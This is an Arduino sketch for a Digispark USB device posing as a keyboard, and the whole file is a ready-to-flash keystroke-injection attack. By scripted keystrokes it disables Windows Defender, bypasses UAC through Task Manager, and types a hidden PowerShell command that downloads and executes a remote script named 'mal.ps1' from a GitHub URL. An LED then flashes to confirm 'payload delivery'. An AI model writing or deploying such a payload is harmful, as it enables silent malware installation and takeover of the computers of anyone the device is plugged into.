#include "DigiKeyboard.h"

void setup() {

 // setup LED 
//
  pinMode(1, OUTPUT);

// flush keyboard
//
  Keyboard.update();
  Keyboard.sendKeyStroke(0);
 // Disable Defender
  Keyboard.delay(2000);
  Keyboard.sendKeyStroke(KEY_S, KEY_MOD_RGUI); 
  Keyboard.delay(100); 
  Keyboard.write("Windows Security");
  Keyboard.delay(400);
  Keyboard.sendKeyStroke(KEY_ENTER);
    Keyboard.delay(2000);
  Keyboard.sendKeyStroke(KEY_ENTER);
  
    Keyboard.delay(1000);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(400);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(200);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(200);
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(200);
  Keyboard.sendKeyStroke(KEY_SPACE);
  Keyboard.delay(800);
  Keyboard.sendKeyStroke(KEY_SPACE);
  Keyboard.delay(800);
  Keyboard.sendKeyStroke(KEY_ARROW_LEFT);
    Keyboard.delay(800);
  Keyboard.sendKeyStroke(KEY_ENTER);
  Keyboard.delay(800);
// start UAC Bypass
//
    Keyboard.sendKeyStroke(KEY_ESC, KEY_MOD_RCTRL | KEY_MOD_RSHIFT);
    Keyboard.delay(2000);
    Keyboard.sendKeyStroke(KEY_F, KEY_MOD_RALT);
  Keyboard.delay(800);
  Keyboard.sendKeyStroke(KEY_N);
  Keyboard.delay(800);

// enter commands to be run as administrator
//
  Keyboard.write("powershell -windowstyle hidden -command \"IEX (iwr -uri \"http://raw.githubusercontent.com/ElijahCuff/Rubber-DigiKey/main/mal.ps1\" -UseBasicParsing -DisableKeepAlive);\""); 
  Keyboard.delay(800);
// end UAC bypass
//
  Keyboard.sendKeyStroke(KEY_TAB);
  Keyboard.delay(600);  
  Keyboard.sendKeyStroke(KEY_SPACE);
  Keyboard.delay(600);
  Keyboard.sendKeyStroke(KEY_ENTER);
  
  Keyboard.delay(500);
  
 // Enable and close Defender
    Keyboard.sendKeyStroke(KEY_TAB, KEY_MOD_RALT);
  Keyboard.delay(400);
  
  Keyboard.sendKeyStroke(KEY_SPACE);
  Keyboard.delay(400);
    Keyboard.sendKeyStroke(KEY_F4, KEY_MOD_RALT);
}


void loop() {
  // Start Light Flash Loop On Payload Delivery
  digitalWrite(1, HIGH);
  Keyboard.delay(100);
  digitalWrite(1, LOW);
  Keyboard.delay(200);
}
